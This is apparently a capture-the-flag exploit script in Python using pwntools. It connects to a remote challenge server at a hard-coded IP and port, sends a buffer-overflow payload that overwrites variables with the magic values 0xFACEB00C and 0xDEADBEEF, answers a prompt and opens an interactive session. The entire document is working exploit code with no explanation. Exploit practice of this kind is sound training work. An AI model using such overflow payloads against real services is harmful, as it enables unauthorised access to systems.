from pwn import *

ip = "140.110.112.77"
port = 2111

r = remote(ip, port)
# r = process("./luck")

payload = flat([0, 0, 0, 0xFACEB00C, 0xDEADBEEF, 0])

r.sendlineafter("me:", payload)
r.sendlineafter(":", "pass")

r.interactive()
